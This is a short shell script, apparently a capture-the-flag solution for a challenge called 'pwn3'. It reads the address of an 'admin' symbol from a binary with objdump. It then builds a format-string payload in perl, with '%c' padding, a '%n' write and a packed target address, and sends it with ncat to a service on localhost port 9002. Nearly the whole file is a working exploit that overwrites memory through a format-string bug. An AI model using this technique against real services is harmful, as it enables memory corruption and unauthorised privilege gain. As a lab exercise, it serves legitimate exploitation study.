#!/bin/sh
if [ ! -f main ]; then
	echo "main is missing, unpack archive first"
	echo "tar xf ../pwn3.tar.gz main"
	exit 1
fi

addr=$(objdump -t 'main' \
	| fgrep admin \
	| grep -Po '^[0-9a-f]+'
)

value="$(( 0x$addr ))"
perl <<EOF | ncat 127.0.0.1 9002
print('%c' x 8);            # align with string
print('%c%c  %n');
print(pack('Q', ${value})); # address
EOF
